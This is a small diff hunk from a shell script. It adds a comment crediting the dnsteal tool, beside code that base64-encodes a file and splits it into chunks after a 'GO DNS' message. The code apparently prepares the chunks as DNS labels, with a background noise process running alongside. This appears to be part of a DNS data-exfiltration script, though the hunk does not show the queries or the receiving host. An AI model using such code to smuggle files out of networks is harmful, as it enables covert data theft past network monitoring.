@@ -60,6 +60,7 @@ _noise(){
  
 _noise & PID="$!"                                                       
 echo "GO DNS"                                                           
+## No need to think, take it : https://github.com/m57/dnsteal
 for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\n/g");do          
     if [[ "$c" -lt "$s"  ]]; then                                       
         echo -ne "$i-."                                                 
